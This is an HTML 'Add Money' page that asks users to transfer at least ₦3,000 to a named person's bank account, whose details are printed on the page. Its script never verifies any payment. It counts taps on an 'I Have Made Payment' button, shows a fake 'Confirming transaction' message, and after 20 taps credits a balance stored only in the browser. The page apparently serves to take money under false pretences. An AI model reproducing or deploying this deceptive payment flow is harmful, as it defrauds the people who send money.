<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Add Money</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #fff;
      padding: 20px;
    }
    .card {
      background: #fff0f0;
      border: 1px solid #ffd6d6;
      border-radius: 15px;
      padding: 20px;
      box-shadow: 0 0 10px #f3caca;
    }
    .title {
      font-size: 20px;
      font-weight: bold;
      margin-bottom: 15px;
      color: #d90000;
    }
    input[type="number"] {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      margin-bottom: 15px;
      border-radius: 10px;
      border: 1px solid #ccc;
    }
    .btn {
      background-color: #d90000;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 10px;
      font-size: 16px;
      cursor: pointer;
    }
    .account-info {
      display: none;
      margin-top: 20px;
      background: #fff;
      border: 1px solid #ccc;
      border-radius: 15px;
      padding: 15px;
    }
    .info-title {
      font-weight: bold;
      margin-bottom: 10px;
    }
    .popup {
      position: fixed;
      top: 30%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      border: 1px solid #ddd;
      box-shadow: 0 0 10px #aaa;
      padding: 20px;
      border-radius: 15px;
      text-align: center;
      display: none;
      z-index: 10;
    }
    .overlay {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.4);
      display: none;
      z-index: 5;
    }
  </style>
</head>
<body>
  <div class="overlay" id="overlay"></div>
  <div class="popup" id="popup"></div>

  <div class="card">
    <div class="title">Add Money</div>
    <input type="number" id="amountInput" placeholder="Enter amount (₦3,000 min)" />
    <button class="btn" onclick="continuePayment()">Continue</button>

    <div class="account-info" id="accountSection">
      <div class="info-title">Send ₦3,000 to:</div>
      <p><b>Name:</b> EMMANUEL OKWUNNA</p>
      <p><b>Bank:</b> SmartCash Payment Service Bank</p>
      <p><b>Account:</b> 812 489 0070</p>
      <button class="btn" onclick="confirmPayment()">I Have Made Payment</button>
    </div>
  </div>

  <script>
    const overlay = document.getElementById('overlay');
    const popup = document.getElementById('popup');
    const accountSection = document.getElementById('accountSection');
    const amountInput = document.getElementById('amountInput');

    let tapCount = parseInt(localStorage.getItem('tapCount') || '0');
    let balance = parseInt(localStorage.getItem('balance') || '0');

    function showPopup(message, duration = 2000) {
      popup.innerText = message;
      overlay.style.display = 'block';
      popup.style.display = 'block';
      setTimeout(() => {
        overlay.style.display = 'none';
        popup.style.display = 'none';
      }, duration);
    }

    function continuePayment() {
      const amount = parseInt(amountInput.value);
      if (!amount || amount < 3000) {
        showPopup("Please input minimum of ₦3,000", 2500);
        return;
      }

      showPopup("Please wait...", 2000);
      setTimeout(() => {
        accountSection.style.display = 'block';
      }, 2000);
    }

    function confirmPayment() {
      tapCount++;
      localStorage.setItem('tapCount', tapCount);

      if (tapCount >= 20) {
        balance += 3000;
        localStorage.setItem('balance', balance);
        localStorage.setItem('tapCount', 0);
        showPopup("₦3,000 has been added to your wallet!", 3000);
      } else {
        showPopup("Please wait... Confirming transaction", 2000);
      }
    }
  </script>
</body>
</html>
